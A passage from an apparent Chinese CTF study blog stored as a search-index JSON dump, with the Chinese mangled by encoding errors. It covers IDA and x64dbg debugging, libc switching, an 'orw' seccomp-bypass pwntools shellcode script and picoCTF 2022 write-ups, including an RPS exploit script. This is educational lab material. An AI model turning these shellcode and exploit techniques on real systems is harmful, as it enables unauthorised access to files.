chunk\n","categories":["pwn_study"],"tags":["heap"]},{"title":"idaä½¿ç”¨+åŠ¨è°ƒ","url":"/2025/03/19/ida%E4%BD%BF%E7%94%A8-%E5%8A%A8%E8%B0%83/","content":"idaåŠ¨æ€è°ƒè¯•æ–­ç‚¹ä¸€èˆ¬æ‰“çš„éƒ½æ˜¯è½¯ä»¶æ–­ç‚¹\nç¡¬ä»¶æ–­ç‚¹çš„è®¾æ³•ï¼šæ‰“å¥½æ–­ç‚¹å\n\næ‰“å¼€æ‰¾åˆ°åˆšæ‰æ‰“ä¸‹çš„æ–­ç‚¹åå³é”®Editç¼–è¾‘å‹¾é€‰Hardware\nå·®åˆ«ï¼š\n\n1. å®ç°åŸç†ï¼š\n\nè½¯ä»¶æ–­ç‚¹ï¼š\nè½¯ä»¶æ–­ç‚¹æ˜¯é€šè¿‡ä¿®æ”¹ç¨‹åºæŒ‡ä»¤æ¥å®ç°çš„ã€‚åœ¨ä»£ç ä¸­æ’å…¥ä¸€ä¸ªç‰¹å®šçš„ä¸­æ–­æŒ‡ä»¤ï¼ˆä¾‹å¦‚ï¼Œåœ¨x86æ¶æ„ä¸­æ˜¯INT 3æŒ‡ä»¤ï¼‰ã€‚\nè°ƒè¯•å™¨ä¼šè®°å½•è¢«æ›¿æ¢çš„åŸå§‹æŒ‡ä»¤ï¼Œå¹¶åœ¨ç¨‹åºç»§ç»­æ‰§è¡Œæ—¶æ¢å¤å®ƒã€‚\n\n\nç¡¬ä»¶æ–­ç‚¹ï¼š\nç¡¬ä»¶æ–­ç‚¹ä¸éœ€è¦ä¿®æ”¹ç¨‹åºä»£ç ã€‚\n\n\n\n2. èµ„æºé™åˆ¶ï¼š\n\nè½¯ä»¶æ–­ç‚¹ï¼š\nè½¯ä»¶æ–­ç‚¹åœ¨æ•°é‡ä¸Šæ²¡æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼Œå¯ä»¥åœ¨ç¨‹åºä¸­çš„ä»»æ„ä½ç½®è®¾ç½®ã€‚\n\n\nç¡¬ä»¶æ–­ç‚¹ï¼š\nCPUæä¾›çš„ç¡¬ä»¶æ–­ç‚¹å¯„å­˜å™¨æ•°é‡æœ‰é™ï¼Œå› æ­¤å¯ä»¥åŒæ—¶è®¾ç½®çš„ç¡¬ä»¶æ–­ç‚¹æ•°é‡ä¹Ÿæœ‰é™ã€‚ï¼ˆæœ€å¤šå››ä¸ªï¼‰\n\n\n\n3. ä½¿ç”¨åœºæ™¯ï¼š\n\nè½¯ä»¶æ–­ç‚¹ï¼š\nè½¯ä»¶æ–­ç‚¹é€‚ç”¨äºå¤§å¤šæ•°è°ƒè¯•åœºæ™¯ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦è®¾ç½®å¤§é‡æ–­ç‚¹æ—¶ã€‚\n\n\nç¡¬ä»¶æ–­ç‚¹ï¼š\nç¡¬ä»¶æ–­ç‚¹é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š\nè°ƒè¯•æ— æ³•ä¿®æ”¹ä»£ç çš„ç¨‹åºï¼Œä¾‹å¦‚åªè¯»å†…å­˜ä¸­çš„ä»£ç ã€‚\nè°ƒè¯•éœ€è¦ç²¾ç¡®æ§åˆ¶æ‰§è¡Œæµç¨‹çš„ç¨‹åºï¼Œä¾‹å¦‚å†…æ ¸ä»£ç æˆ–é©±åŠ¨ç¨‹åºã€‚\nè°ƒè¯•æ•°æ®æ–­ç‚¹ï¼Œå°±æ˜¯å½“æŸä¸ªå†…å­˜åœ°å€è¢«è¯»å–æˆ–è€…å†™å…¥çš„æ—¶å€™å‡ºå‘æ–­ç‚¹ï¼Œè¿™æ˜¯ç¡¬ä»¶æ–­ç‚¹ç‰¹æœ‰çš„åŠŸèƒ½ã€‚\n\n\n\n\n\n4. éšè”½æ€§ï¼š\n\nè½¯ä»¶æ–­ç‚¹ï¼š\nè½¯ä»¶æ–­ç‚¹ä¼šä¿®æ”¹ç¨‹åºä»£ç ï¼Œå› æ­¤å¯èƒ½ä¼šè¢«ä¸€äº›åè°ƒè¯•æŠ€æœ¯æ£€æµ‹åˆ°ã€‚\n\n\nç¡¬ä»¶æ–­ç‚¹ï¼š\nç¡¬ä»¶æ–­ç‚¹ä¸ä¼šä¿®æ”¹ç¨‹åºä»£ç ï¼Œå› æ­¤å…·æœ‰æ›´é«˜çš„éšè”½æ€§ã€‚\n\n\n\næ€»ç»“ï¼š\n\nè½¯ä»¶æ–­ç‚¹çµæ´»æ–¹ä¾¿ï¼Œé€‚ç”¨äºå¤§å¤šæ•°è°ƒè¯•åœºæ™¯ï¼Œä½†å¯èƒ½ä¼šè¢«åè°ƒè¯•æŠ€æœ¯æ£€æµ‹åˆ°ã€‚\nç¡¬ä»¶æ–­ç‚¹éšè”½æ€§é«˜ï¼Œé€‚ç”¨äºç‰¹æ®Šè°ƒè¯•åœºæ™¯ï¼Œä½†æ•°é‡æœ‰é™\n\n\n\næ¡ä»¶æ–­ç‚¹\næ¡ä»¶æ–­ç‚¹æ˜¯ä¸€ç§åœ¨è°ƒè¯•å™¨ä¸­è®¾ç½®çš„æ–­ç‚¹ï¼Œå®ƒä»…åœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶æ‰ä¼šè§¦å‘ã€‚åœ¨æ¡†ä½ç½®è¾“å…¥æ¡ä»¶\n\n\n\næ›´æ”¹å­—èŠ‚é€‰ä¸­è¦æ›´æ”¹çš„é‚£ä¸ªå­—èŠ‚\nå³é”®\n\næ›´æ”¹ä¹‹åApply patch to åº”ç”¨è¿™ä¸ªè¡¥ä¸\n[FlareOn6]Overlong\nelfæ–‡ä»¶åŠ¨æ€è°ƒè¯•1.æ‰¾åˆ°idaçš„æ ¹ç›®å½•ï¼Œæ‰¾åˆ°dbgsrvæ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­æ‰¾åˆ°\n\næ ¹æ®elfæ–‡ä»¶çš„è¿›åˆ¶é€‰æ‹©ï¼ˆä»¥64è¿›åˆ¶å’Œsnake.elfä¸ºä¾‹ï¼‰\nå°†linux server64å’Œsnakeæ‹–å…¥æ–‡ä»¶å¤¹ä¸­\nä¹‹ååœ¨è™šæ‹Ÿæœºç»ˆç«¯å†…è¾“å‡ºchmod +x linux_server64èµ‹äºˆæ–‡ä»¶æ‰§è¡Œæƒåˆ©\nä¹‹åè¾“å…¥./linux_server64è¿è¡Œæ–‡ä»¶ï¼ˆä¹‹åç­‰å¾…ä¸»æœºè¿æ¥ï¼‰\nå†æ‰“å¼€ä¸€ä¸ªç»ˆç«¯è¾“å…¥ip addrè·å–è™šæ‹Ÿæœºipåœ°å€\næ£€æµ‹æ˜¯å¦å¯ä»¥æˆåŠŸï¼š\næ‰“å¼€ä¸»æœºç»ˆç«¯è¾“å…¥ ping  +è™šæ‹Ÿæœºip(ä¸‹å›¾å³ä¸ºæ¥è¿æ¥æˆåŠŸ)\n\nä¹‹åæ‰“å¼€Debugger&gt;Process options&gt;\n\n1:å¡«snakeåœ¨è™šæ‹Ÿæœºä¸­çš„ä½ç½®\n2ï¼šå¡«snakeåœ¨è™šæ‹Ÿæœºæ‰€åœ¨æ–‡ä»¶çš„æ–‡ä»¶ä½ç½®\n3ï¼šå¡«è™šæ‹Ÿæœºip\n4:è¿è¡Œ.&#x2F;linux_server64åï¼Œè¾“å‡ºListening on 0.0.0.0:23946ï¼ˆä¸€èˆ¬é»˜è®¤ï¼‰\nä¹‹åå°±å¯ä»¥æ­£å¸¸è¿è¡Œï¼ˆä¸‹æ¬¡è¿è¡Œæ—¶åœ¨æ­¤è¿è¡Œ.&#x2F;linux_server64ï¼Œå¹¶æŠŠæ–‡ä»¶æ‹–å…¥æƒ³ç›¸åŒç›®å½•å³å¯ï¼‰\næ˜¾ç¤ºæ‰€æœ‰æœºå™¨ç ï¼šâ€‹\tOptions&gt;general&gt;æ”¹ä¸º10\n\nx64dbgF2ï¼šè®¾ç½®æ–­ç‚¹ã€‚ï¼‰F4ï¼šè¿è¡Œåˆ°å…‰æ ‡å¤„F7ï¼šå•æ­¥æ­¥å…¥ã€‚ï¼ˆé‡åˆ°callæŒ‡ä»¤ï¼Œè¿›å…¥callå‡½æ•°çš„å®ç°å¤„ç»§ç»­æ‰§è¡Œæ±‡ç¼–æŒ‡ä»¤ï¼‰F8ï¼šå•æ­¥æ­¥è¿‡ã€‚ï¼ˆé‡åˆ°callæŒ‡ä»¤ï¼Œæ‰§è¡Œcallå‡½æ•°ï¼Œä¹‹åæ¥ç€æ‰§è¡ŒcallæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼‰F9ï¼šè¿è¡Œç¨‹åºï¼ˆå¦‚æœæ²¡æœ‰ç¢°åˆ°æ–­ç‚¹ï¼Œç¨‹åºä¼šä¸€ç›´æ‰§è¡Œåˆ°ç»“æŸã€‚ï¼‰\nCtrl+F9: æ‰§è¡Œåˆ°å‡½æ•°è¿”å›å¤„ï¼Œç”¨äºè·³å‡ºå‡½æ•°å®ç°\nAlt+F9:æ‰§è¡Œåˆ°ç”¨æˆ·ä»£ç ï¼Œç”¨äºå¿«é€Ÿè·³å‡ºç³»ç»Ÿå‡½æ•°\nCtrl+G:è¾“å…¥åå…­è¿›åˆ¶åœ°å€ï¼Œå¿«é€Ÿå®šä½åˆ°è¯¥åœ°å€å¤„\n","categories":["re_study"],"tags":["RE","èŠ±æŒ‡ä»¤"]},{"title":"libcç‰ˆæœ¬åˆ‡æ¢","url":"/2025/08/02/libc%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/","content":"æ›´æ¢libcç‰ˆæœ¬é¦–å…ˆè¦æ‹¿åˆ°å¯¹åº”çš„libc.soæ–‡ä»¶\nç„¶åæŸ¥çœ‹ç‰ˆæœ¬\nstrings libcæ–‡ä»¶å |grep ubuntu\n\n\nç„¶ååˆ‡æ¢clibcç‰ˆæœ¬\nlibc æ–‡ä»¶å libcç‰ˆæœ¬ä¿¡æ¯\n\n\næŸ¥çœ‹libcç‰ˆæœ¬é€šè¿‡gotè¡¨æ³„éœ²libcç‰ˆæœ¬\nè¾“å‡ºä¸€ä¸ªå¤–ç½®å‡½æ•°çš„gotè¡¨åœ°å€\nç„¶ååœ¨ç½‘ç«™åŒ¹é…ä¹‹åä¸‹è½½\nä¸‹è½½æ²¡æœ‰çš„libcæ–‡ä»¶\nhttps://launchpad.net/ubuntu/+source/glibc/&lt;libcç‰ˆæœ¬&gt; ##ä¾‹å¦‚2.31-0ubuntu9.9\n\n\n\næŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶ä¸‹è½½åˆ°glibc-all-in-oneä¸­çš„debs\nç„¶åå»æ‰§è¡Œ\n./extract debs/libc6_2.35-0ubuntu3.10_amd64.deb libs/2.35-0ubuntu3.10_amd64./extract debs/libc6-dbg_2.35-0ubuntu3.10_amd64.deb libs/2.35-0ubuntu3.10_amd64/.debug\n\nç„¶åæŠŠè§£å‹å‡ºæ¥çš„ä¸œè¥¿æ”¾åœ¨å¯¹åº”çš„libcæ–‡ä»¶å¤„å°±å¯ä»¥äº†\næˆ‘çš„è·¯å¾„æ˜¯File System&#x2F;&#x2F;lib&#x2F;freelibs&#x2F;å¯¹åº”æ–‡ä»¶å¤¹\n","categories":["pwn_study"],"tags":["PWN"]},{"title":"orw","url":"/2025/08/04/orw/","content":"orwæ˜¯openã€readå’Œwriteä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨çš„ç¼©å†™ã€‚orw æ”»å‡»æ˜¯ä¸€ç§ç»•è¿‡æ²™ç®±ï¼ˆSandboxï¼‰æˆ–NXä¿æŠ¤çš„æŠ€æœ¯ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šä¸ç›´æ¥è·å–shellï¼Œè€Œæ˜¯é€šè¿‡è¿™ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨æ¥è¯»å–ç›®æ ‡æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯flagæ–‡ä»¶ï¼‰ï¼Œç„¶åå°†å…¶å†…å®¹æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºï¼Œä»è€Œè·å¾—flagã€‚\nä¼ ç»Ÿçš„ç¼“å†²åŒºæº¢å‡ºæ”»å‡»é€šå¸¸ä¼šå°è¯•æ³¨å…¥ä¸€æ®µ shellcodeï¼Œè¿™æ®µ shellcode çš„ä½œç”¨æ˜¯æ‰§è¡Œ execve(â€œ&#x2F;bin&#x2F;shâ€, NULL, NULL) æ¥è·å–ä¸€ä¸ªäº¤äº’å¼ shellã€‚ç„¶è€Œï¼Œåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹ï¼Œè¿™ç§ä¼ ç»Ÿæ”»å‡»ä¼šå¤±è´¥ï¼š\nNXï¼ˆNo-eXecuteï¼‰ä¿æŠ¤ï¼šå¦‚æœç¨‹åºçš„æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œä½ æ³¨å…¥çš„ shellcode æ— æ³•åœ¨æ ˆä¸Šè¿è¡Œã€‚\nseccomp æ²™ç®±ï¼šä¸€äº›ç¨‹åºä¼šä½¿ç”¨ seccompï¼ˆå®‰å…¨è®¡ç®—æ¨¡å¼ï¼‰æ¥é™åˆ¶è¿›ç¨‹å¯ä»¥è°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¦‚æœ execve è¢«ç¦ç”¨ï¼Œå³ä½¿ä½ æˆåŠŸæ³¨å…¥äº† shellcodeï¼Œå®ƒä¹Ÿæ— æ³•æ‰§è¡Œã€‚\n\n\n\nè¿™ä¸ªå°±æ˜¯å…¸å‹çš„orw\nç”¨\nseccomp-tools dump ./orw #æŸ¥çœ‹å…è®¸çš„å‡½æ•°è°ƒç”¨\n\n\nè„šæœ¬\nfrom pwn import *r = remote(&#x27;node5.buuoj.cn&#x27;,29475)context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;orw&#x27;)shellcode = shellcraft.open(&#x27;/flag&#x27;)shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)shellcode = asm(shellcode)r.sendline(shellcode)r.interactive()\n\n","categories":["exercise_pwn"],"tags":["PWN","orw"]},{"title":"picoCTF2022","url":"/2025/07/10/picoCTF2022/","content":"CRYPTOVigenereé¢˜ç›®ä¿¡æ¯\nkey CYLAB\ncipher:  rgnoDVD&#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&#125;\né¢˜ç›®ç»™äº†å¯†æ–‡å’Œå¯†é’¥ï¼Œç”¨éšæ³¢é€æµæ‰“å¼€ï¼Œè§£å¯†ï¼Œå‘ç°æ˜¯ç»´å‰å°¼äºšåŠ å¯†\n\nflag:picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q}\nbasic-mod1é¢˜ç›®ä¿¡æ¯\næè¿°ï¼š æˆ‘ä»¬å‘ç°è¿™ä¸ªå¥‡æ€ªçš„æ¶ˆæ¯åœ¨æœåŠ¡å™¨ä¸Šä¼ é€’ï¼Œæˆ‘ä»¬è®¤ä¸ºæˆ‘ä»¬æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ decrpytion æ–¹æ¡ˆã€‚å–æ¯ä¸ªæ•°å­— mod 37 å¹¶å°†å…¶æ˜ å°„åˆ°ä»¥ä¸‹å­—ç¬¦é›†ï¼š0-25 æ˜¯å­—æ¯è¡¨ï¼ˆå¤§å†™ï¼‰ï¼Œ26-35 æ˜¯åè¿›åˆ¶æ•°å­—ï¼Œ36 æ˜¯ä¸‹åˆ’çº¿ã€‚ä»¥ picoCTF æ ‡å¿—æ ¼å¼åŒ…è£…è§£å¯†çš„æ¶ˆæ¯ï¼ˆå³ picoCTF{decrypted_message}ï¼‰\næ•°å­—ï¼š350 63 353 198 114 369 346 184 202 322 94 235 114 110 185 188 225 212 366 374 261 213 \næŒ‰ç…§é¢˜ç›®ä¿¡æ¯å¯¹å–æ¨¡åšçš„æ•°å­—æ ¹æ®å…¶ASCLLç ä¿®æ”¹ï¼Œå¹¶è½¬åŒ–ä¸ºå­—ç¬¦è¾“å‡º\ndef simplify_numbers(numbers):    result = []    for num in numbers:        remainder = num % 37        if 0 &lt;= remainder &lt;= 25:            result.append(chr(ord(&#x27;A&#x27;) + remainder))        elif 26 &lt;= remainder &lt;= 35:            result.append(str(remainder - 26))        elif remainder == 36:            result.append(&#x27;_&#x27;)        else:            result.append(f&quot;[&#123;remainder&#125;]&quot;)    return &quot;&quot;.join(result)my_numbers = [350, 63, 353, 198, 114, 369, 346, 184, 202, 322, 94, 235, 114, 110, 185, 188, 225, 212, 366, 374, 261, 213]simplified_string = simplify_numbers(my_numbers)print(simplified_string)\n\nflagï¼špicoCTF{R0UND_N_R0UND_ADD17EC2}\nsubstitution0é¢˜ç›®ä¿¡æ¯\næè¿°ï¼š\nä¸€æ¡æ¶ˆæ¯è¿›æ¥äº†ï¼Œä½†ä¼¼ä¹å…¨éƒ½ä¹±ä¸ƒå…«ç³Ÿã€‚å¹¸è¿çš„æ˜¯ï¼Œå®ƒä¼¼ä¹ä¸€å¼€å§‹å°±æœ‰é’¥åŒ™ã€‚ä½ èƒ½ç ´è§£è¿™ä¸ªæ›¿æ¢å¯†ç å—ï¼Ÿ\nå¯†æ–‡ï¼š\nOHNFUMWSVZLXEGCPTAJDYIRKQB \nSuauypcg Xuwaogf oacju, rvds o waoiu ogf jdoduxq ova, ogf hacywsd eu dsu huudxumace o wxojj noju vg rsvns vd roj ugnxcjuf. Vd roj o huoydvmyx jnoaohouyj, ogf, oddsod dveu, yglgcrg dc godyaoxvjdjâ€”cm ncyaju o wauod pavbu vg o jnvugdvmvn pcvgdcm ivur. Dsuau ruau drc acygf hxonl jpcdj guoa cgu ukdauevdq cm dsu honl, ogf oxcgw cgu guoa dsu cdsua. Dsu jnoxuj ruau uknuufvgwxq soaf ogf wxcjjq, rvds oxx dsuoppuoaognu cm hyagvjsuf wcxf. Dsu ruvwsd cm dsu vgjund roj iuaq aueoalohxu, ogf,dolvgw oxx dsvgwj vgdc ncgjvfuaodvcg, V ncyxf soafxq hxoeu Zypvdua mca svj cpvgvcgaujpundvgw vd.\nDsu mxow vj: pvncNDM&#123;5YH5717Y710G_3I0XY710G_03055505&#125;\nè§£å¯†\nçŒœæµ‹å¯†é’¥å‡¯æ’’å¯†ç åŠ å¯†ï¼ŒæŠŠç¬¬ä¸€å¥ä½œä¸ºå¯†é’¥\nflag; picoCTF{5UB5717U710N_3V0LU710N_03055505}\nRESafe Openeré¢˜ç›®ä¿¡æ¯\næè¿°ï¼šä½ èƒ½æ‰“å¼€è¿™ä¸ªä¿é™©ç®±å—ï¼Ÿæˆ‘å¿˜è®°äº†ä¿é™©ç®±çš„é’¥åŒ™ï¼Œä½†è¿™ä¸ªç¨‹åºåº”è¯¥å¯ä»¥å¸®åŠ©æˆ‘æ‰¾å›ä¸¢å¤±çš„é’¥åŒ™ã€‚ä½ èƒ½å¸®æˆ‘æ‰“å¼€ä¿é™©ç®±å—ï¼Ÿå°†æ‚¨æ¢å¤çš„å¯†ç æ”¾å…¥ picoCTF æ ‡å¿—æ ¼å¼ï¼Œä¾‹å¦‚ï¼špicoCTF{password}\nä»£ç \nimport java.io.*;import java.util.*;  public class SafeOpener &#123;    public static void main(String args[]) throws IOException &#123;        BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in));        Base64.Encoder encoder = Base64.getEncoder();//Base6çš„ç¼–ç å™¨        String encodedkey = &quot;&quot;;        String key = &quot;&quot;;        int i = 0;        boolean isOpen;                while (i &lt; 3) &#123;            System.out.print(&quot;Enter password for the safe: &quot;);            key = keyboard.readLine();            encodedkey = encoder.encodeToString(key.getBytes());//å¯¹å¯†ç è¿›è¡ŒBase64åŠ å¯†            System.out.println(encodedkey);                          isOpen = openSafe(encodedkey);//è°ƒç”¨æ–¹æ³•è¿›è¡Œæ ¸å¯¹            if (!isOpen) &#123;                System.out.println(&quot;You have  &quot; + (2 - i) + &quot; attempt(s) left&quot;);                i++;                continue;            &#125;            break;        &#125;    &#125;        public static boolean openSafe(String password) &#123;        String encodedkey = &quot;cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz&quot;;//BASE64åŠ å¯†åçš„ç»“æœ                if (password.equals(encodedkey)) &#123;            System.out.println(&quot;Sesame open&quot;);            return true;        &#125;        else &#123;            System.out.println(&quot;Password is incorrect\\n&quot;);            return false;        &#125;    &#125;&#125;\n\n\n\næ­£å¦‚ä»£ç ä¸­çš„æ³¨é‡Šä¸€æ ·ï¼Œç”¨æˆ·è¾“å…¥å¯†ç ï¼Œè¿›è¡ŒBase64ç¼–ç ï¼Œè°ƒç”¨å‡½æ•°æ£€éªŒç¼–ç åšçš„æ•°å€¼æ˜¯å¦ç¬¦åˆæŒ‡å®šå­—ç¬¦ï¼Œæ‰€ä»¥å¯†ç å°±æ˜¯æŒ‡å®šå­—ç¬¦Base64è§£ç \n\nflagï¼špicoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}\nGDB testé¢˜ç›®ä¿¡æ¯\nä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿ\nä»¥ä¸‹æ˜¯è¯•ç”¨è¯´æ˜ï¼š\n$ chmod +x gdbme$ gdb gdbme(gdb) layout asm(gdb) break *(main+99)(gdb) run(gdb) jump *(main+104)\n\nè§£å¯†\næŒ‰ç…§ç»™çš„å‘½ä»¤è¿›è¡Œæ“ä½œ\n\nflag: picoCTF{d3bugg3r_dr1v3_7776d758}\nfresh-javaé¢˜ç›®ä¿¡æ¯\nä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ª Java ç¨‹åºè¿›è¡Œé€†å‘å·¥ç¨‹\nç”¨jad-guiæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°è¯¥å¯†æ–‡å·²å°†è¢«å®šä¹‰å¥½äº†\n\nflagï¼špicoCTF{700l1ng_r3qu1r3d_738cac89}\nfile-run1é¢˜ç›®ä¿¡æ¯\nå·²ä¸ºæ‚¨æä¾›ä¸€ä¸ªç¨‹åºï¼Œå¦‚æœæ‚¨å°è¯•åœ¨å‘½ä»¤è¡Œä¸Šè¿è¡Œå®ƒä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ\nè§£å¯†\né¦–å…ˆè¦ä¸ºç¨‹åºèµ‹æƒé™  chmod +x ru\nè¿è¡Œè¯¥ç¨‹åºå¹¶ä¸”æ‰§è¡Œå‘½ä»¤.&#x2F;run\n\nflag:picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}\nfile-run2é¢˜ç›®ä¿¡æ¯\nå¦ä¸€ä¸ªç¨‹åºï¼Œä½†è¿™ä¸€æ¬¡ï¼Œå®ƒä¼¼ä¹éœ€è¦ä¸€äº›è¾“å…¥ã€‚å¦‚æœæ‚¨å°è¯•åœ¨å‘½ä»¤è¡Œä¸Šè¿è¡Œå®ƒå¹¶è¾“å…¥ â€œHelloï¼â€ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ\nè§£å¯†\né¦–å…ˆè¦ä¸ºç¨‹åºèµ‹æƒé™  chmod +x ru\nè¿è¡Œè¯¥ç¨‹åºå¹¶ä¸”æ‰§è¡Œå‘½ä»¤.&#x2F;run Hello!\n\nflag:picoCTF{F1r57_4rgum3n7_f65ed63e}\nBbbbloaté¢˜ç›®ä¿¡æ¯\nä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œé€†å‘å·¥ç¨‹ã€‚\nè§£å¯†\n\nåˆ†æå¾—åˆ°ï¼Œæœ€å–œæ¬¢çš„æ˜¯æ•°å­—åº”è¯¥ä¸º549255\nä¸ºæ–‡ä»¶èµ‹æƒé™ chmod +x Bbbbloat\nè¿è¡Œç¨‹åº./Bbbbloat\n\nflagï¼špicoCTF{cu7_7h3_bl047_44f74a60}\nunpackmeé¢˜ç›®æè¿°\nä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œé€†å‘å·¥ç¨‹ã€‚\nè§£å¯†\næ–‡ä»¶ä»¥upxç»“å°¾ï¼Œå°è¯•upxè„±å£³\n\nä¹‹åæ‹–å…¥idaä¸­\n\nå‘ç°æœ€å–œçˆ±çš„æ•°å­—æ˜¯754635\n\nflag: picoCTF{up&gt;&lt;_m3_f7w_e510a27f}\nPWNRPSé¢˜ç›®æè¿°\nè¿™æ˜¯ä¸€ä¸ªå¯¹ä½ ç©çŸ³å¤´å‰ªåˆ€å¸ƒçš„ç¨‹åºã€‚æˆ‘å¬è¯´å¦‚æœä½ è¿ç»­èµ¢äº† 5 æ¬¡ï¼Œå°±ä¼šå‘ç”Ÿå¥½äº‹ã€‚å¯ä»¥ä¸‹è½½å¸¦æœ‰æ ‡è®°å·²ç¼–è¾‘çš„ç¨‹åºæºä»£ç  è¿™é‡Œ ã€‚\nè§£å¯†\nä¸»å‡½æ•°\nint main () &#123;  char input[3] = &#123;&#x27;\\0&#x27;&#125;;  int command;  int r;  puts(&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;);  puts(&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;);  puts(&quot;Are you ready?&quot;);    while (true) &#123;    puts(&quot;Type &#x27;1&#x27; to play a game&quot;);    puts(&quot;Type &#x27;2&#x27; to exit the program&quot;);    r = tgetinput(input, 3);    // Timeout on user input    if(r == -3)    &#123;      printf(&quot;Goodbye!\\n&quot;);      exit(0);    &#125;    //å‰é¢é‚£äº›éƒ½ä¸é‡è¦            if ((command = strtol(input, NULL, 10)) == 0) &#123;      puts(&quot;Please put in a valid number&quot;);          &#125; else if (command == 1) &#123;      printf(&quot;\\n\\n&quot;);      if (play()) &#123;        wins++;      &#125; else &#123;        wins = 0;      &#125;      if (wins &gt;= 5) &#123;        puts(&quot;Congrats, here&#x27;s the flag!&quot;);        puts(flag);      &#125;    &#125; else if (command == 2) &#123;      return 0;    &#125; else &#123;      puts(&quot;Please type either 1 or 2&quot;);    &#125;  &#125;  return 0;&#125;\n\nåˆ¤æ–­èƒœè´Ÿ\n//åˆ¤æ–­èƒœè´Ÿbool play () &#123;  char player_turn[100];  srand(time(0));//ç”µè„‘çš„å‡ºæ‹³è®¾è®¡  int r;  printf(&quot;Please make your selection (rock/paper/scissors):\\n&quot;);//æ ¡éªŒ  r = tgetinput(player_turn, 100);  if(r == -3)  &#123;    printf(&quot;Goodbye!\\n&quot;);    exit(0);  &#125;  int computer_turn = rand() % 3;//ç¡®ä¿åœ¨3ä¸ªæ‰‹åŠ¿ä¸­éšæœºé€‰æ‹©ä¸€ä¸ª  printf(&quot;You played: %s\\n&quot;, player_turn);  printf(&quot;The computer played: %s\\n&quot;, hands[computer_turn]);  if (strstr(player_turn, loses[computer_turn])) &#123;//æ ¸éªŒæˆ‘ä»¬æ‰€å‡ºçš„æ˜¯å¦åŒ…å«èƒœåˆ©æ‰€éœ€è¦åº•è‰²é‚£ä¸ªæ‰‹åŠ¿    puts(&quot;You win! Play again?&quot;);    return true;  &#125; else &#123;    puts(&quot;Seems like you didn&#x27;t win this time. Play again?&quot;);    return false;  &#125;&#125;\n\næ‰€ä»¥æˆ‘ä»¬è¦ç»è¿‡5æ¬¡å¾ªç¯ï¼Œä¸”æ¯æ¬¡å¾ªç¯éƒ½è¦å‘ç¨‹åºè¾“å‡ºrock&#x2F;paper&#x2F;scissorsçš„ç»“åˆ\nè„šæœ¬from pwn import *p = remote(&#x27;saturn.picoctf.net&#x27;, 60179)for i in range(5):    p.sendline(b&#x27;1&#x27;)    p.sendline(b&#x27;rock/paper/scissors&#x27;)print(p.recvline_contains(b&#x27;picoCTF&#123;&#x27;))\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbasic-file-exploit æ¼æ´é¢˜ç›®ä¿¡æ¯\næä¾›çš„ç¨‹åºå…è®¸æ‚¨å†™å…¥æ–‡ä»¶å¹¶ä»ä¸­è¯»å–æ‚¨å†™å…¥çš„å†…å®¹ã€‚è¯•ç€ç©å¼„å®ƒï¼Œçœ‹çœ‹ä½ æ˜¯å¦èƒ½æ‰“ç ´å®ƒï¼å¯ä»¥ä¸‹è½½å¸¦æœ‰æ ‡è®°å·²ç¼–è¾‘çš„ç¨‹åºæºä»£ç  è¿™é‡Œ \nè§£å¯†\næœ‰åˆ†æå¯å¾—tgetinputç”¨æ¥æ ¡éªŒç©ºè¾“å…¥ç­‰åŸºæœ¬æ ¡éªŒå·¥ä½œï¼Œdata_writeæ•°æ®è¾“å…¥ï¼Œdata_readæ•°æ®è¯»å–ï¼Œä¸”å…¶ä¸­åŒ…å«flagçš„è¾“å‡º\nç”±mainå¯ä»¥çŸ¥é“ã€‚é¦–å…ˆé€‰æ‹©è¦è¿›è¡Œçš„æ¨¡å¼ï¼Œä¸”ç¬¬ä¸€æ¬¡å¿…é¡»å…ˆå­˜å…¥ï¼Œå¦åˆ™æ— æ³•è°ƒç”¨data_readå‡½æ•°\nstatic void data_read() &#123;  char entry[4];  long entry_number;  char output[100];  int r;  memset(output, &#x27;\\0&#x27;, 100);    printf(&quot;Please enter the entry number of your data:\\n&quot;);  r = tgetinput(entry, 4);  // Timeout on user input  if(r == -3)  &#123;    printf(&quot;Goodbye!\\n&quot;);    exit(0);  &#125;    if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//å°è¯•å°† entry 